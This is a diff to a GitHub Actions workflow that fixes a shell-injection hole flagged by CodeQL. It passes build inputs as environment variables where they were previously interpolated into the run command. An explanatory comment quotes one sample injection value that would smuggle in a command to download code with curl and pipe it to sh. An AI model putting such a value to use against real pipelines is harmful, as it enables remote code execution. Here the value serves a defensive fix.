@@ -130,7 +130,15 @@ jobs:
           queries: security-and-quality
 
       - name: Build
-        run: ${{ matrix.builder_cmd }} build --verbose --autoinstall --version=${{ inputs.full_version }} --hash=${{ inputs.build_hash }} --stamp=${{ inputs.build_stamp }} ${{ inputs.nodownload && '--nodownload' || '' }}
+        # Pass the string inputs as env vars instead of template-interpolating
+        # them into the run: body — GitHub expands ${{ ... }} before the shell
+        # parses, so a value like  1.2"; curl x|sh; #  would inject shell.
+        # Closes CodeQL actions/code-injection/critical #631.
+        env:
+          FULL_VERSION: ${{ inputs.full_version }}
+          BUILD_HASH: ${{ inputs.build_hash }}
+          BUILD_STAMP: ${{ inputs.build_stamp }}
+        run: ${{ matrix.builder_cmd }} build --verbose --autoinstall --version="$FULL_VERSION" --hash="$BUILD_HASH" --stamp="$BUILD_STAMP" ${{ inputs.nodownload && '--nodownload' || '' }}
 
       - name: Test
         if: inputs.codeql == false
